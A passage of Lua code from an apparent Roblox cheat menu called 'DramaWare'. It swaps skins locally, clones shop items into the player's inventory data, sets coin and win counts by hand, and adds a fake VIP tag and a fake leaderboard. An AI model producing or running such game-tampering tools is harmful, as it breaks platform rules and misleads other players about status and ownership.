    PlaceholderText = "Character Name Here...",
    RemoveTextAfterFocusLost = false,
    Flag = "CharacterNameInput",
    Callback = function(Text)
        characterName = Text
    end,
})

CharactersTab:CreateButton({
    Name = "Buy Character (@60)",
    Callback = function()
        if characterName == "" then return end
        local finalText = characterName
        if selectedSymbol ~= "" then
            finalText = characterName .. " " .. selectedSymbol
        end
        game:GetService("ReplicatedStorage").Events.Buy:FireServer("Character", finalText)
    end,
})


do
    local _SC_Players = game:GetService("Players")
    local _SC_LocalPlayer = _SC_Players.LocalPlayer
    local _SC_RS = game:GetService("ReplicatedStorage")

    
    local marshmallowData = {
        ["Marshmallow"] = "http://www.roblox.com/asset/?id=4921967564",
        ["Mr.Coconut Marshmallow"] = "http://www.roblox.com/asset/?id=4993225404",
        ["Cook Surprise Marshmallow"] = "http://www.roblox.com/asset/?id=4993211976",
        ["Soda Marshmallow"] = "http://www.roblox.com/asset/?id=13424792834",
        ["Dino Marshmallow"] = "http://www.roblox.com/asset/?id=13424788699",
        ["Official 3-4 Marshmallow"] = "http://www.roblox.com/asset/?id=9005433388",
        ["Furious Trout Marshmallow"] = "http://www.roblox.com/asset/?id=13557360275",
        ["Orange Marshmallow"] = "http://www.roblox.com/asset/?id=4993231360",
        ["Cabbage Marshmallow"] = "http://www.roblox.com/asset/?id=13424785412",
        ["Toxic Marshmallow"] = "http://www.roblox.com/asset/?id=4939073413",
        ["Grip Marshmallow"] = "http://www.roblox.com/asset/?id=14253207872",
        ["Vote Me Marshmallow"] = "http://www.roblox.com/asset/?id=13424797492",
        ["Honey Dipped Marshmallow"] = "http://www.roblox.com/asset/?id=13424799638",
        ["Banana Marshmallow"] = "http://www.roblox.com/asset/?id=4922748526",
        ["Cursed Idol Marshmallow"] = "http://www.roblox.com/asset/?id=4993221853",
        ["Choc Dipped Marshmallow"] = "http://www.roblox.com/asset/?id=10420319581",
        ["Candyfloss Marshmallow"] = "http://www.roblox.com/asset/?id=4939071806",
        ["Guilty Gift Marshmallow"] = "http://www.roblox.com/asset/?id=13424790186",
        ["Coconut Marshmallow"] = "http://www.roblox.com/asset/?id=4922749819",
        ["Official Marshmallow"] = "http://www.roblox.com/asset/?id=6190482040",
        ["Chocolate Marshmallow"] = "http://www.roblox.com/asset/?id=8989965765",
        ["Toasted Marshmallow"] = "http://www.roblox.com/asset/?id=11109548044",
        ["Surfboard Marshmallow"] = "http://www.roblox.com/asset/?id=14253216830",
        ["Official 2 Marshmallow"] = "http://www.roblox.com/asset/?id=6918605850",
        ["Stink Bomb Marshmallow"] = "http://www.roblox.com/asset/?id=14253212538",
        ["Deathly Frog Marshmallow"] = "http://www.roblox.com/asset/?id=13557357445",
        ["Heart Marshmallow"] = "http://www.roblox.com/asset/?id=11109545563",
        ["Burnt Marshmallow"] = "http://www.roblox.com/asset/?id=4939257688",
        ["Spooky Skull Marshmallow"] = "http://www.roblox.com/asset/?id=13424794215",
        ["Camo Marshmallow"] = "http://www.roblox.com/asset/?id=4993218908",
        ["Star Barrel Marshmallow"] = "http://www.roblox.com/asset/?id=13557362587",
        ["Candycane Marshmallow"] = "http://www.roblox.com/asset/?id=8087099712",
        ["Claus Marshmallow"] = "http://www.roblox.com/asset/?id=8087103731",
        ["Gingerbread Marshmallow"] = "http://www.roblox.com/asset/?id=8087104305",
        ["Snowflake Marshmallow"] = "http://www.roblox.com/asset/?id=8087108522",
        ["Snowman Marshmallow"] = "http://www.roblox.com/asset/?id=8087109234",
        ["Xmas Tree Marshmallow"] = "http://www.roblox.com/asset/?id=8087102391",
        ["Official 5 Marshmallow"] = "http://www.roblox.com/asset/?id=12089683577",
        ["Refresher Marshmallow"] = "http://www.roblox.com/asset/?id=10420322407",
        ["Friendly Fish Marshmallow"] = "http://www.roblox.com/asset/?id=6213300124",
        ["Popcorn Marshmallow"] = "http://www.roblox.com/asset/?id=14253210682",
        ["Salt&Pepper Marshmallow"] = "http://www.roblox.com/asset/?id=4939073043",
        ["Grape Marshmallow"] = "http://www.roblox.com/asset/?id=4939072171",
        ["Mutant Marshmallow"] = "http://www.roblox.com/asset/?id=4993228141",
        ["Blue Sky Marshmallow"] = "http://www.roblox.com/asset/?id=6213301823",
        ["Rainbow Marshmallow"] = "http://www.roblox.com/asset/?id=11109546611",
        ["Animatronic Marshmallow"] = "http://www.roblox.com/asset/?id=14253197608",
        ["Fly Trap Marshmallow"] = "http://www.roblox.com/asset/?id=13557358447",
        ["Lightning Marshmallow"] = "http://www.roblox.com/asset/?id=6213299603",
        ["Official 6 Marshmallow"] = "http://www.roblox.com/asset/?id=13883154348",
        ["Cave Marshmallow"] = "http://www.roblox.com/asset/?id=14253202968",
        ["Briefcase Marshmallow"] = "http://www.roblox.com/asset/?id=14253200770",
        ["Alien Slime Marshmallow"] = "http://www.roblox.com/asset/?id=14253195386",
        ["Strawberry Marshmallow"] = "http://www.roblox.com/asset/?id=8989965284",
        ["Gaffer Marshmallow"] = "http://www.roblox.com/asset/?id=14253205269",
        ["Bane Marshmallow"] = "http://www.roblox.com/asset/?id=4939072726",
        ["All Star Marshmallow"] = "http://www.roblox.com/asset/?id=4993216167",
        ["Voting Machine Marshmallow"] = "http://www.roblox.com/asset/?id=14253219599",
        ["Mint Choc Chip Marshmallow"] = "http://www.roblox.com/asset/?id=10420505533",
        ["Dropped Marshmallow"] = "http://www.roblox.com/asset/?id=6213298209",
        ["Spiderweb Marshmallow"] = "http://www.roblox.com/asset/?id=14891850347",
        ["Mummy Marshmallow"] = "http://www.roblox.com/asset/?id=14891849082",
        ["Jack-o-lantern Marshmallow"] = "http://www.roblox.com/asset/?id=14891848232",
        ["Cauldron Marshmallow"] = "http://www.roblox.com/asset/?id=14891845147",
        ["Ghost Marshmallow"] = "http://www.roblox.com/asset/?id=14891847267",
        ["Candy Corn Marshmallow"] = "http://www.roblox.com/asset/?id=14891843386",
        ["Black Cat Marshmallow"] = "http://www.roblox.com/asset/?id=14891842127",
        ["Frankenstein Marshmallow"] = "http://www.roblox.com/asset/?id=14891846020",
        ["Candy Cane Marshmallow"] = "http://www.roblox.com/asset/?id=15484725814",
        ["Christmas Gift Marshmallow"] = "http://www.roblox.com/asset/?id=15484726913",
        ["Christmas Tree Marshmallow"] = "http://www.roblox.com/asset/?id=15484727551",
        ["Festive Lights Marshmallow"] = "http://www.roblox.com/asset/?id=15484728253",
        ["Frosted Marshmallow"] = "http://www.roblox.com/asset/?id=15484728905",
        ["Hot Chocolate Marshmallow"] = "http://www.roblox.com/asset/?id=15484729538",
        ["Jingle Bell Marshmallow"] = "http://www.roblox.com/asset/?id=15484730291",
        ["Mr Snow Marshmallow"] = "http://www.roblox.com/asset/?id=15484731148",
        ["Reindeer Marshmallow"] = "http://www.roblox.com/asset/?id=15484731823",
        ["Santa Suit Marshmallow"] = "http://www.roblox.com/asset/?id=15484732509",
        ["Snowglobe Marshmallow"] = "http://www.roblox.com/asset/?id=15484733560",
        ["The Grunch Marshmallow"] = "http://www.roblox.com/asset/?id=15484734379",
        ["Bacon Grease Marshmallow"] = "http://www.roblox.com/asset/?id=16029143731",
        ["Pink Paint Marshmallow"] = "http://www.roblox.com/asset/?id=16029151877",
        ["Skunk Tail Marshmallow"] = "http://www.roblox.com/asset/?id=16029163767",
        ["Rodent Face Marshmallow"] = "http://www.roblox.com/asset/?id=16029162747",
        ["Candy Marshmallow"] = "http://www.roblox.com/asset/?id=16029146948",
        ["Lychee Soda Marshmallow"] = "http://www.roblox.com/asset/?id=16029149121",
        ["Banana Soda Marshmallow"] = "http://www.roblox.com/asset/?id=16029144639",
        ["The Wolves Marshmallow"] = "http://www.roblox.com/asset/?id=16029164794",
        ["Young Chester Marshmallow"] = "http://www.roblox.com/asset/?id=16029185414",
        ["Owl Mascot Marshmallow"] = "http://www.roblox.com/asset/?id=16029150192",
        ["Racoon Marshmallow"] = "http://www.roblox.com/asset/?id=16029160256",
        ["Abstract Cake Marshmallow"] = "http://www.roblox.com/asset/?id=16029142769",
        ["Circus Snake Marshmallow"] = "http://www.roblox.com/asset/?id=16029148014",
        ["Bogey Marshmallow"] = "http://www.roblox.com/asset/?id=16029145643",
        ["Sap Removal Marshmallow"] = "http://www.roblox.com/asset/?id=16029165998",
        ["Carrot Marshmallow"] = "http://www.roblox.com/asset/?id=16735788642",
        ["Easter Basket Marshmallow"] = "http://www.roblox.com/asset/?id=16735790050",
        ["Easter Bunny Marshmallow"] = "http://www.roblox.com/asset/?id=16726342799",
        ["Easter Chick Marshmallow"] = "http://www.roblox.com/asset/?id=16735787584",
        ["Easter Egg Marshmallow"] = "http://www.roblox.com/asset/?id=16735791814",
        ["Lion Marshmallow"] = "http://www.roblox.com/asset/?id=16726346946",
        ["Official 7 Marshmallow"] = "http://www.roblox.com/asset/?id=16752097514",
    }
    local marshmallowList = {}
    for name in pairs(marshmallowData) do table.insert(marshmallowList, name) end
    table.sort(marshmallowList)

    local function applyMarshmallow(texture)
        local char = _SC_LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        local gui = head:FindFirstChild("MarshmallowGUI")
        if not gui then return end
        local sector = gui:FindFirstChild("Sector")
        if not sector then return end
        local imageLabel = sector:FindFirstChildOfClass("ImageLabel")
        if imageLabel then imageLabel.Image = texture end
    end

    local _SC_CSRoot = _SC_RS:WaitForChild("Products"):WaitForChild("CharacterSelection"):WaitForChild("Characters")
    local skinList = {}
    local skinMap  = {}
    local skinFaceMap = {}
    for _, gender in ipairs(_SC_CSRoot:GetChildren()) do
        for _, character in ipairs(gender:GetChildren()) do
            local skins = character:FindFirstChild("Skins")
            if skins then
                local charKey = gender.Name .. " | " .. character.Name
                for _, skin in ipairs(skins:GetChildren()) do
                    local label = charKey .. " | " .. skin.Name
                    table.insert(skinList, label)
                    skinMap[label]  = skin
                    local fd = skin:FindFirstChildOfClass("Decal")
                    if fd then
                        skinFaceMap[label] = fd.Texture
                    else
                        local cfd = character:FindFirstChildOfClass("Decal")
                        skinFaceMap[label] = cfd and cfd.Texture or ""
                    end
                end
            end
        end
    end
    table.sort(skinList)

    local function _SC_findAttachment(char, attName)
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("Attachment") and part.Name == attName then return part end
        end
    end
    local function applySkin(skinObj, faceTexture)
        local char = _SC_LocalPlayer.Character
        if not char then return end
        for _, v in ipairs(char:GetChildren()) do
            if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("Accessory")
            or v:IsA("ShirtGraphic") or v:IsA("CharacterMesh") or v:IsA("Hat") then
                v:Destroy()
            end
        end
        local function doApplyFace()
            local head = char:FindFirstChild("Head")
            if not head or not faceTexture or faceTexture == "" then return end
            local fc = head:FindFirstChildOfClass("FaceControls")
            if fc then fc:Destroy() end
            local sa = head:FindFirstChildOfClass("SurfaceAppearance")
            if sa then sa.ColorMap = faceTexture end
            local decal = head:FindFirstChildOfClass("Decal")
            if not decal then
                decal = Instance.new("Decal")
                decal.Name = "face"
                decal.Face = Enum.NormalId.Front
                decal.Parent = head
            end
            decal.Texture = faceTexture
        end
        doApplyFace()
        task.delay(0.2, doApplyFace)
        task.delay(0.7, doApplyFace)
        local clothesFolder = skinObj:FindFirstChild("Clothes")
        if not clothesFolder then return end
        local shirt = clothesFolder:FindFirstChildOfClass("Shirt")
        if shirt then shirt:Clone().Parent = char end
        local pants = clothesFolder:FindFirstChildOfClass("Pants")
        if pants then pants:Clone().Parent = char end
        local bodyColors = clothesFolder:FindFirstChildOfClass("BodyColors")
        if bodyColors then
            local existing = char:FindFirstChildOfClass("BodyColors")
            if existing then existing:Destroy() end
            bodyColors:Clone().Parent = char
        end
        for _, v in ipairs(clothesFolder:GetChildren()) do
            if v:IsA("CharacterMesh") then v:Clone().Parent = char end
        end
        for _, v in ipairs(clothesFolder:GetChildren()) do
            if v:IsA("Accessory") then
                local clone = v:Clone()
                local handle = clone:FindFirstChild("Handle")
                if handle then
                    handle.Massless = true
                    local handleAtt = nil
                    for _, child in ipairs(handle:GetDescendants()) do
                        if child:IsA("Attachment") then handleAtt = child break end
                    end
                    if handleAtt then
                        local charAtt = _SC_findAttachment(char, handleAtt.Name)
                        if charAtt then
                            local rigid = Instance.new("RigidConstraint")
                            rigid.Attachment0 = charAtt
                            rigid.Attachment1 = handleAtt
                            rigid.Parent = clone
                        end
                    end
                end
                clone.Parent = char
            elseif v:IsA("Hat") then
                v:Clone().Parent = char
            end
        end
        local function disableCollision()
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end
        disableCollision()
        task.delay(0.1, disableCollision)
        task.delay(0.5, disableCollision)
    end

    CharactersTab:CreateSection("Skin Changer")

    CharactersTab:CreateDropdown({
        Name = "Skin Changer",
        Options = {"None", table.unpack(skinList)},
        CurrentOption = "None",
        Flag = "SkinChangerSkinDropdown",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local label = tostring(opt or "")
            if label == "None" or label == "" then return end
            local skin = skinMap[label]
            local face = skinFaceMap[label]
            if skin then
                applySkin(skin, face)
                Rayfield:Notify({ Title = "Skin Applied", Content = skin.Name, Duration = 3, Image = "shirt" })
            end
        end,
    })
    CharactersTab:CreateDropdown({
        Name = "Marshmallow Changer",
        Options = {"None", table.unpack(marshmallowList)},
        CurrentOption = "None",
        Flag = "SkinChangerMallowDropdown",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local name = tostring(opt or "")
            if name == "None" or name == "" then return end
            local tex = marshmallowData[name]
            if tex then
                applyMarshmallow(tex)
                Rayfield:Notify({ Title = "Marshmallow Applied", Content = name, Duration = 3, Image = "smile" })
            end
        end,
    })
    
    if isCamp then
        CharactersTab:CreateDropdown({
            Name = "Elimination Changer",
            Options = {"None", "Sleigh Elimination"},
            CurrentOption = "None",
            MultipleOptions = false,
            Flag = "EliminationChangerDropdown",
            Callback = function(selected)
                local choice = type(selected) == "table" and selected[1] or selected
                if choice == "Sleigh Elimination" then
                    swapToSleigh()
                end
            end,
        })
    end
    
    CharactersTab:CreateButton({
        Name = "Get All Skins (inventory)",
        Callback = function()
            local _rs = game:GetService("ReplicatedStorage")
            local _lp = game:GetService("Players").LocalPlayer
            local _DataStore = _lp:WaitForChild("DataStore")
            for _, _category in ipairs(_rs.Products.Shop.Items:GetChildren()) do
                local dsCat = _DataStore:FindFirstChild(_category.Name)
                if dsCat then
                    for _, _item in ipairs(dsCat:GetChildren()) do _item:Destroy() end
                    for _, _item in ipairs(_category:GetChildren()) do _item:Clone().Parent = dsCat end
                end
            end
        end,
    })

    --[[
    
    owner vision:
    this was my idea, it is just limited to shitty in-game assets
    originally you would be able to use any accessory etc but kobi cba
    
    ]]

    CharactersTab:CreateSection("Custom Skin Builder")

    local _csb_faceOptions    = {"None"}
    local _csb_shirtOptions   = {"None"}
    local _csb_pantsOptions   = {"None"}
    local _csb_accOptions     = {"None"}

    local _csb_faceMap  = {} 
    local _csb_shirtMap = {}  
    local _csb_pantsMap = {}  
    local _csb_accMap   = {} 

    local _seenFace  = {}
    local _seenShirt = {}
    local _seenPants = {}
    local _seenAcc   = {}

    for label, skinObj in pairs(skinMap) do
        local faceKey = skinFaceMap[label] or ""
        if faceKey ~= "" and not _seenFace[faceKey] then
            _seenFace[faceKey] = true
            local skinName = label:match("| ([^|]+)$") or label
            local faceLabel = skinName .. " (face)"
            _csb_faceMap[faceLabel] = faceKey
            table.insert(_csb_faceOptions, faceLabel)
        end
        local clothes = skinObj:FindFirstChild("Clothes")
        if clothes then
            local shirt = clothes:FindFirstChildOfClass("Shirt")
            if shirt and not _seenShirt[shirt.ShirtTemplate or ""] then
                _seenShirt[shirt.ShirtTemplate or ""] = true
                local skinName = label:match("| ([^|]+)$") or label
                local shirtLabel = skinName .. " (shirt)"
                _csb_shirtMap[shirtLabel] = shirt
                table.insert(_csb_shirtOptions, shirtLabel)
            end
            local pants = clothes:FindFirstChildOfClass("Pants")
            if pants and not _seenPants[pants.PantsTemplate or ""] then
                _seenPants[pants.PantsTemplate or ""] = true
                local skinName = label:match("| ([^|]+)$") or label
                local pantsLabel = skinName .. " (pants)"
                _csb_pantsMap[pantsLabel] = pants
                table.insert(_csb_pantsOptions, pantsLabel)
            end
            for _, v in ipairs(clothes:GetChildren()) do
                if (v:IsA("Accessory") or v:IsA("Hat")) and not _seenAcc[v.Name] then
                    _seenAcc[v.Name] = true
                    local skinName = label:match("| ([^|]+)$") or label
                    local accLabel = skinName .. " - " .. v.Name
                    _csb_accMap[accLabel] = v
                    table.insert(_csb_accOptions, accLabel)
                end
            end
        end
    end

    table.sort(_csb_faceOptions,  function(a,b) return a < b end)
    table.sort(_csb_shirtOptions, function(a,b) return a < b end)
    table.sort(_csb_pantsOptions, function(a,b) return a < b end)
    table.sort(_csb_accOptions,   function(a,b) return a < b end)

    for _, t in ipairs({_csb_faceOptions, _csb_shirtOptions, _csb_pantsOptions, _csb_accOptions}) do
        for i, v in ipairs(t) do
            if v == "None" then table.remove(t, i) break end
        end
        table.insert(t, 1, "None")
    end

    local function _csb_applyAccessory(accObj)
        local char = _SC_LocalPlayer.Character
        if not char then return end
        local clone = accObj:Clone()
        local handle = clone:FindFirstChild("Handle")
        if handle then
            handle.Massless = true
            local handleAtt = nil
            for _, child in ipairs(handle:GetDescendants()) do
                if child:IsA("Attachment") then handleAtt = child break end
            end
            if handleAtt then
                local charAtt = _SC_findAttachment(char, handleAtt.Name)
                if charAtt then
                    local rigid = Instance.new("RigidConstraint")
                    rigid.Attachment0 = charAtt
                    rigid.Attachment1 = handleAtt
                    rigid.Parent = clone
                end
            end
        end
        clone.Parent = char
    end

    CharactersTab:CreateDropdown({
        Name = "Face",
        Options = _csb_faceOptions,
        CurrentOption = "None",
        Flag = "CSB_Face",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local label = tostring(opt or "")
            if label == "None" or label == "" then return end
            local tex = _csb_faceMap[label]
            if not tex then return end
            local char = _SC_LocalPlayer.Character
            if not char then return end
            local head = char:FindFirstChild("Head")
            if not head then return end
            local fc = head:FindFirstChildOfClass("FaceControls")
            if fc then fc:Destroy() end
            local sa = head:FindFirstChildOfClass("SurfaceAppearance")
            if sa then sa.ColorMap = tex end
            local decal = head:FindFirstChildOfClass("Decal")
            if not decal then
                decal = Instance.new("Decal")
                decal.Name = "face"
                decal.Face = Enum.NormalId.Front
                decal.Parent = head
            end
            decal.Texture = tex
        end,
    })

    CharactersTab:CreateDropdown({
        Name = "Shirt",
        Options = _csb_shirtOptions,
        CurrentOption = "None",
        Flag = "CSB_Shirt",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local label = tostring(opt or "")
            if label == "None" or label == "" then return end
            local shirtObj = _csb_shirtMap[label]
            if not shirtObj then return end
            local char = _SC_LocalPlayer.Character
            if not char then return end
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("Shirt") then v:Destroy() end
            end
            shirtObj:Clone().Parent = char
        end,
    })

    CharactersTab:CreateDropdown({
        Name = "Pants",
        Options = _csb_pantsOptions,
        CurrentOption = "None",
        Flag = "CSB_Pants",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local label = tostring(opt or "")
            if label == "None" or label == "" then return end
            local pantsObj = _csb_pantsMap[label]
            if not pantsObj then return end
            local char = _SC_LocalPlayer.Character
            if not char then return end
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("Pants") then v:Destroy() end
            end
            pantsObj:Clone().Parent = char
        end,
    })

    CharactersTab:CreateDropdown({
        Name = "Accessory",
        Options = _csb_accOptions,
        CurrentOption = "None",
        Flag = "CSB_Accessory",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local label = tostring(opt or "")
            if label == "None" or label == "" then return end
            local accObj = _csb_accMap[label]
            if not accObj then return end
            _csb_applyAccessory(accObj)
        end,
    })

    local function _csb_getSavedSkins()
        local names = {"None"}
        pcall(function()
            if not isfolder("DramaWare") then makefolder("DramaWare") end
            if not isfolder("DramaWare/CustomSkins") then makefolder("DramaWare/CustomSkins") end
            local files = listfiles and listfiles("DramaWare/CustomSkins") or {}
            for _, path in ipairs(files) do
                local name = tostring(path):match("([^/\]+)%.json$")
                if name and name ~= "" then table.insert(names, name) end
            end
        end)
        return names
    end

    local _csb_loadDropdown = nil
    local _csb_selectedLoad = "None"

    CharactersTab:CreateInput({
        Name = "Save Custom Skin (press Enter to save)",
        PlaceholderText = "Enter save name...",
        RemoveTextAfterFocusLost = true,
        Flag = "CSB_SaveName",
        Callback = function(text)
            local saveName = tostring(text or ""):match("^%s*(.-)%s*$")
            if saveName == "" then
                Rayfield:Notify({ Title = "Save Failed", Content = "Enter a name first.", Duration = 3, Image = "alert-triangle" })
                return
            end
            local char = _SC_LocalPlayer.Character
            if not char then return end
            local data = {}
            local head = char:FindFirstChild("Head")
            if head then
                local decal = head:FindFirstChildOfClass("Decal")
                if decal then data.face = decal.Texture end
            end
            local shirt = char:FindFirstChildOfClass("Shirt")
            if shirt then data.shirt = shirt.ShirtTemplate end
            local pants = char:FindFirstChildOfClass("Pants")
            if pants then data.pants = pants.PantsTemplate end
            data.accessories = {}
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("Accessory") or v:IsA("Hat") then
                    table.insert(data.accessories, v.Name)
                end
            end
            pcall(function()
                if not isfolder("DramaWare") then makefolder("DramaWare") end
                if not isfolder("DramaWare/CustomSkins") then makefolder("DramaWare/CustomSkins") end
                writefile("DramaWare/CustomSkins/" .. saveName .. ".json", game:GetService("HttpService"):JSONEncode(data))
            end)
            local newList = _csb_getSavedSkins()
            if _csb_loadDropdown then
                pcall(function() _csb_loadDropdown:Refresh(newList) end)
            end
            Rayfield:Notify({ Title = "Skin Saved", Content = saveName, Duration = 3, Image = "save" })
        end,
    })

    _csb_loadDropdown = CharactersTab:CreateDropdown({
        Name = "Load Custom Skin",
        Options = _csb_getSavedSkins(),
        CurrentOption = "None",
        Flag = "CSB_LoadSkin",
        Callback = function(Option)
            local opt = (type(Option) == "table") and (Option.Option or Option[1]) or Option
            local name = tostring(opt or "")
            if name == "None" or name == "" then return end
            _csb_selectedLoad = name
            local path = "DramaWare/CustomSkins/" .. name .. ".json"
            local ok, src = pcall(readfile, path)
            if not ok or not src or src == "" then
                Rayfield:Notify({ Title = "Load Failed", Content = "File not found.", Duration = 3, Image = "alert-triangle" })
                return
            end
            local ok2, data = pcall(function() return game:GetService("HttpService"):JSONDecode(src) end)
            if not ok2 or not data then return end
            local char = _SC_LocalPlayer.Character
            if not char then return end
            
            for _, v in ipairs(char:GetChildren()) do
                if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("Accessory") or v:IsA("Hat") then
                    v:Destroy()
                end
            end
            
            if data.face and data.face ~= "" then
                local head = char:FindFirstChild("Head")
                if head then
                    local decal = head:FindFirstChildOfClass("Decal")
                    if not decal then
                        decal = Instance.new("Decal")
                        decal.Name = "face"
                        decal.Face = Enum.NormalId.Front
                        decal.Parent = head
                    end
                    decal.Texture = data.face
                end
            end
            
            if data.shirt and data.shirt ~= "" then
                local s = Instance.new("Shirt")
                s.ShirtTemplate = data.shirt
                s.Parent = char
            end
            
            if data.pants and data.pants ~= "" then
                local p = Instance.new("Pants")
                p.PantsTemplate = data.pants
                p.Parent = char
            end
            
            if data.accessories then
                for _, accName in ipairs(data.accessories) do
                    for _, skinObj in pairs(skinMap) do
                        local clothes = skinObj:FindFirstChild("Clothes")
                        if clothes then
                            local found = clothes:FindFirstChild(accName)
                            if found and (found:IsA("Accessory") or found:IsA("Hat")) then
                                _csb_applyAccessory(found)
                                break
                            end
                        end
                    end
                end
            end
            Rayfield:Notify({ Title = "Skin Loaded", Content = name, Duration = 3, Image = "shirt" })
        end,
    })

    CharactersTab:CreateButton({
        Name = "Delete Selected Skin",
        Callback = function()
            if not _csb_selectedLoad or _csb_selectedLoad == "None" or _csb_selectedLoad == "" then
                Rayfield:Notify({ Title = "Nothing Selected", Content = "Pick a skin from the dropdown first.", Duration = 3, Image = "alert-circle" })
                return
            end
            local path = "DramaWare/CustomSkins/" .. _csb_selectedLoad .. ".json"
            local deleted = false
            pcall(function()
                if isfile(path) then
                    delfile(path)
                    deleted = true
                end
            end)
            if deleted then
                Rayfield:Notify({ Title = "Skin Deleted", Content = '"' .. _csb_selectedLoad .. '" deleted.', Duration = 3, Image = "trash-2" })
                local newList = _csb_getSavedSkins()
                if _csb_loadDropdown then
                    pcall(function() _csb_loadDropdown:Refresh(newList) end)
                end
                _csb_selectedLoad = "None"
            else
                Rayfield:Notify({ Title = "Not Found", Content = 'No skin named "' .. _csb_selectedLoad .. '".', Duration = 3, Image = "alert-circle" })
            end
        end,
    })

end
CharactersTab:CreateDivider()

_G.SelectedFont = nil
_G.StaticColor = Color3.fromRGB(255, 182, 193)
_G.StaticColorCustom = false
_G.RainbowMode = false
_G.RainbowSpeed = 0.5
_G.CustomName = ""
_G.UseCustomName = false

ClientTab:CreateDivider()
ClientTab:CreateInput({
   Name = "Custom Name",
   PlaceholderText = "Enter name here...",
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
       _G.CustomName = Text
       _G.UseCustomName = (Text ~= "")
   end,
})
ClientTab:CreateSlider({
   Name = "Rainbow Speed",
   Range = {0, 5},
   Increment = 0.1,
   Suffix = "x",
   CurrentValue = 0.5,
   Flag = "SpeedSlider",
   Callback = function(Value)
      _G.RainbowSpeed = Value
   end,
})

ClientTab:CreateToggle({
    Name = "VIP Name Tag",
    CurrentValue = false,
    Flag = "VIPNameTag",
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local char = player.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        local playerName = head:FindFirstChild("playerName")
        if not playerName then return end
        local vip = playerName:FindFirstChild("VIP")
        if vip then
            vip.Visible = Value
            for _, v in ipairs(vip:GetDescendants()) do
                if v:IsA("GuiObject") then v.Visible = Value end
            end
        end
        for _, v in ipairs(playerName:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("TextButton") then
                if Value then
                    if not _G.VIPOrigColors then _G.VIPOrigColors = {} end
                    if not _G.VIPOrigColors[v] then _G.VIPOrigColors[v] = v.TextColor3 end
                    v.TextColor3 = Color3.fromRGB(255, 165, 0)
                else
                    if _G.VIPOrigColors and _G.VIPOrigColors[v] then
                        v.TextColor3 = _G.VIPOrigColors[v]
                        _G.VIPOrigColors[v] = nil
                    end
                end
            end
        end
    end,
})

ClientTab:CreateToggle({
   Name = "Rainbow Effect",
   CurrentValue = false,
   Flag = "RainbowToggle",
   Callback = function(Value)
      _G.RainbowMode = Value
   end,
})


do
    local _rainbowMarshEnabled = false
    local _rainbowMarshConn = nil

    local function _getImageLabel()
        local char = game.Players.LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        local gui = head:FindFirstChild("MarshmallowGUI")
        if not gui then return end
        local sector = gui:FindFirstChild("Sector")
        if not sector then return end
        return sector:FindFirstChildOfClass("ImageLabel")
    end

    ClientTab:CreateToggle({
        Name = "Rainbow Marshmallow",
        CurrentValue = false,
        Flag = "RainbowMarshmallowCycler",
        Callback = function(Value)
            _rainbowMarshEnabled = Value
            if Value then
                _rainbowMarshConn = game:GetService("RunService").RenderStepped:Connect(function()
                    local imageLabel = _getImageLabel()
                    if imageLabel then
                        local hue = (tick() * _G.RainbowSpeed) % 1
                        imageLabel.ImageColor3 = Color3.fromHSV(hue, 0.6, 1)
                    end
                end)
            else
                if _rainbowMarshConn then
                    _rainbowMarshConn:Disconnect()
                    _rainbowMarshConn = nil
                end
                local imageLabel = _getImageLabel()
                if imageLabel then
                    imageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255)
                end
            end
        end,
    })
end

ClientTab:CreateColorPicker({
    Name = "Static Color",
    Color = Color3.fromRGB(255, 182, 193),
    Flag = "ColorPicker",
    Callback = function(Value)
        _G.StaticColor = Value
        _G.StaticColorCustom = true
    end
})

ClientTab:CreateSection("Stats")
ClientTab:CreateInput({
    Name = "Custom Coins",
    CurrentValue = "",
    PlaceholderText = "Numbers only...",
    RemoveTextAfterFocusLost = false,
    Flag = "CustomCoins",
    Callback = function(Text)
        pcall(function() game.Players.LocalPlayer.DataStore.Coins.Value = Text end)
    end,
})

ClientTab:CreateInput({
    Name = "Custom Camp Wins",
    CurrentValue = "",
    PlaceholderText = "Numbers only...",
    RemoveTextAfterFocusLost = false,
    Flag = "CustomCampWins",
    Callback = function(Text)
        pcall(function() game.Players.LocalPlayer.DataStore.CampWins.Value = Text end)
    end,
})

ClientTab:CreateInput({
    Name = "Custom Movies Wins",
    CurrentValue = "",
    PlaceholderText = "Numbers only...",
    RemoveTextAfterFocusLost = false,
    Flag = "CustomMoviesWins",
    Callback = function(Text)
        pcall(function() game.Players.LocalPlayer.DataStore.MoviesWins.Value = Text end)
    end,
})

ClientTab:CreateInput({
    Name = "Custom Expedition Wins",
    CurrentValue = "",
    PlaceholderText = "Numbers only...",
    RemoveTextAfterFocusLost = false,
    Flag = "CustomExpeditionWins",
    Callback = function(Text)
        pcall(function() game.Players.LocalPlayer.DataStore.ExpeditionWins.Value = Text end)
    end,
})

ClientTab:CreateInput({
    Name = "Custom Official Wins",
    CurrentValue = "",
    PlaceholderText = "Numbers only...",
    RemoveTextAfterFocusLost = false,
    Flag = "CustomOfficialWins",
    Callback = function(Text)
        pcall(function() game.Players.LocalPlayer.DataStore.OfficialWins.Value = Text end)
    end,
})

ClientTab:CreateButton({
    Name = "Fake #1 Leaderboard",
    Callback = function()
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
